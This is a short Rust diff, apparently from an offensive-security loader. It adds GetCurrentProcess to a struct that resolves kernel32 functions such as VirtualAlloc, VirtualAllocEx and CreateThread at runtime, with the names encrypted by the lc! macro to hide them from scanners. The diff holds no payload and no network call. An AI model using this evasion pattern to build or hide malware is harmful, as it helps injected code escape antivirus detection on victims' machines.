@@ -55,6 +55,8 @@ pub mod Functions {
 
     #[derive(Debug)]
     pub struct obf_kernel32 {
+        pub GetCurrentProcess:
+            Symbol<unsafe extern "C" fn() -> isize>,
         pub VirtualAlloc:
             Symbol<unsafe extern "C" fn(*const c_void, usize, u32, u32) -> *mut c_void>,
         pub VirtualAllocEx:
@@ -115,6 +117,11 @@ pub mod Functions {
     pub fn initialize_obf_kernel32() -> obf_kernel32 {
         unsafe {
             let kernel32 = Library::new("kernel32.dll").unwrap();
+
+            let get_current_process: libloading::Symbol<
+                unsafe extern "C" fn() -> isize>
+            = kernel32.get(&[lc!("GetCurrentProcess").as_bytes(), b"\0"].concat())
+            .unwrap();
 
             let virtual_alloc: libloading::Symbol<
                 unsafe extern "C" fn(*const c_void, usize, u32, u32) -> *mut c_void,
@@ -193,6 +200,7 @@ pub mod Functions {
             let resume_thread: libloading::Symbol<unsafe extern "C" fn(isize) -> i32> = kernel32.get(&[lc!("ResumeThread").as_bytes(), b"\0"].concat()).unwrap();
 
             return obf_kernel32 {
+                GetCurrentProcess: get_current_process.into_raw(),
                 VirtualAlloc: virtual_alloc.into_raw(),
                 VirtualProtect: virtual_protect.into_raw(),
                 CreateThread: create_thread.into_raw(),
